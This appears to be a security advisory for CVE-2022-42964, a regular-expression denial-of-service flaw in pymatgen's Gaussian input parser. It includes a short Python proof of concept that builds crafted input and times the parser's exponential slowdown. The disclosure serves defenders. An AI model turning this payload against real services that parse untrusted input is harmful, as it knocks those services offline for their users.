---
description: CVE-2022-42964 Medium severity. Exponential ReDoS in pymatgen leads to denial of service
title: pymatgen ReDoS
date_published: "2022-10-15"
last_updated: "2022-10-15"
xray_id: XRAY-257184
vul_id: CVE-2022-42964
cvss: 5.9
severity: medium
discovered_by: Denys Vozniuk
type: vulnerability

---

## Summary

Exponential ReDoS in pymatgen leads to denial of service

## Component

[pymatgen](https://pypi.org/project/pymatgen)

## Affected versions

pymatgen (,)

## Description

An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the pymatgen PyPI package, when an attacker is able to supply arbitrary input to the `GaussianInput.from_string` method

## PoC

```python
import time
from pymatgen.io.gaussian import GaussianInput

def str_and_from_string(i):
    ans = """#P HF/6-31G(d) SCF=Tight SP

H4 C1

0 1
"""
    vulnerable_input = ans + 'C'+'0' * i + '!'+'\n'
    GaussianInput.from_string(vulnerable_input)

for i in range(1000):
    start = time.time()
    str_and_from_string(i)
    print(f"{i}: Done in {time.time() - start}")
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-42964)